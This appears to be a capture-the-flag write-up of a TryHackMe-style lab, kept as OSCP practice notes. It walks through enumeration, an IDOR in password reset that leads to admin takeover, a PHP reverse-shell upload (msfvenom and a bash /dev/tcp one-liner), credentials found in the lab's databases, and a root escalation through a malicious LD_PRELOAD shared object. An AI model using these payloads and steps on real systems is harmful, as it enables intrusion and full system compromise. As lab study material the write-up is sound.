---
Status: "#Not-Started"
OS:
ip:
Start_Time: 2026-02-18 10:03
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
```
	I started with a complete nmap scan and find that the target only has ports 22 and 80 opened. So the valuable point here is the target web service. I directly used ip address to access the web and succeed. 

![[assets/Pasted image 20260218101030.png]]
	Let's test the web service. Here we have an order tracking function, which may contain IDOR vulnerabilitiess. 

![[assets/Pasted image 20260218101142.png]]
	Also here we have a contact us, which can be tested for potential XSS or other vaulnerabilities.

![[assets/Pasted image 20260218101237.png]]
	And in merchant central, there is a login page. If we get credential, we can login here and have furthur exploitation.
	Following the result, next I did the directory enumeration. And it returns many valuable directories.
![[assets/Pasted image 20260218102750.png]]
```
Using dirsearch
dirsearch -u url
```
	Following the results, I test the directory v2/admin and found a registration field. I registered an account and came to the dashboard.

![[assets/Pasted image 20260218104206.png]]

---

##  3. Vulnerability Identification & Foothold
### 3.1 Vulnerability Discovery
	First, I test the contact us form submission area for XSS. But the request in burp shows that the target does a escaping in backend and front end.
	
![[assets/Pasted image 20260218102134.png]]
	Then I test the track order function, the request URL shows that there is highly possible an IDOR exists.
	When I backed to the directory enumeration results, I found another directory called v2/admin and I visit it. This directory contains a register field, so I just register it and login.

![[assets/Pasted image 20260218185715.png]]
	Next, I visit the dashboard. 

![[assets/Pasted image 20260218185834.png]]
	However, I can't click anything but the search area. So I try to search  a number and it returned this to me.

![[assets/Pasted image 20260218185924.png]]
	Okay. So let's try to figure out the logic here. By using the inspect, I found that target is missing a js file and its directory. Also there are missing many other things, so the front end is not working.
![[assets/Pasted image 20260218190259.png]]
	However, after some testing, including test the profile page, I found that only admin has access to this now. And I found the admin email, which is admin@sky.thm . There is nothing else can do here. 

![[assets/Pasted image 20260218192454.png]]
	I back to the dashboard and found that there is one more thing I can do---password resetting.

![[assets/Pasted image 20260218195446.png]]
	With using burp, I tried to modified the request. I changed the username to admin@sky.thm .
![[assets/Pasted image 20260218195529.png]]
	I succeed. This is truely a IDOR vulnerability, and I can login as admin now.

![[assets/Pasted image 20260218200433.png]]
	Clearly I have the access to upload the file, so this time I tried to upload a php reverse shell.
```
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php
```
	Listening the port. Then I visit the file and trigger it.I get the connection.

![[assets/Pasted image 20260218202349.png]]
	However, this php shell is not that stable. Once the http request ends, it shuts down.
	So I changed to another payload.

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"); ?>
```

![[assets/Pasted image 20260218202811.png]]
##  4. Privilege Escalation

### 4.1 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [ ] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [x] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).
	First, I list the info of current user and try to use sudo -l to view the commands. However, sudo -l needs password.

![[assets/Pasted image 20260218203643.png]]
![[assets/Pasted image 20260218203652.png]]
![[assets/Pasted image 20260218203659.png]]
	And target has no cronjobs. So I try to view the suid for possible escalation path.

![[assets/Pasted image 20260218203743.png]]

![[assets/Pasted image 20260218203840.png]]
	Target's html directory also shows no escalation path.

![[assets/Pasted image 20260218203946.png]]
	But I found that target has a database. Let's check the database. Also, I found that there is a potential credential for database.

![[assets/Pasted image 20260218204257.png]]
	First, using that credential, I tried to visit the database.
```
# Show the tables
mysql -u root -pThisIsSecurePassword! -e "show databases;"
# show the sky tables
mysql -u root -pThisIsSecurePassword! -e "use SKY; show tables;"

```
	However, there is no other credentials.

![[assets/Pasted image 20260218204935.png]]
	So i get back and run the linPeas.
![[assets/Pasted image 20260218210954.png]]
	After analyzing, I found that database is still high possible. There is a mongo db exist except the mysqli, let's check it.
	I run mongo and directly goes into shell.

![[assets/Pasted image 20260218211156.png]]
![[assets/Pasted image 20260218211209.png]]
	After some enumeration, I found a credential for user webdeveloper.

![[assets/Pasted image 20260218212444.png]]
```
Username:webdeveloper
Password:BahamasChapp123!@#
```
### 4.2 Escalation Path
	I switch to webdeveloper.

![[assets/Pasted image 20260218212615.png]]
	Now let's check for this user's escalation path.
![[assets/Pasted image 20260218212716.png]]
	Clearly, this is the escalation path. Let's work on it.

```
echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}' > /tmp/pe.c
```
	I first write a file called pe.c. Next, using gcc to run it as the shared.
```
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
```
	Next, I run that command to trigger it and become the root.
```
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility
```
![[assets/Pasted image 20260218213006.png]]

---


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type  | Flag Content (Hash)              | Screenshot (Link)                           |
| :--------- | :------------------------------- | :------------------------------------------ |
| user.txt** | 63191e4ece37523c9fe6bb62a5e64d45 | ![[assets/Pasted image 20260218213147.png]] |
| root.txt** | 3a62d897c40a815ecbe267df2f533ac6 | ![[assets/Pasted image 20260218213156.png]] |

---

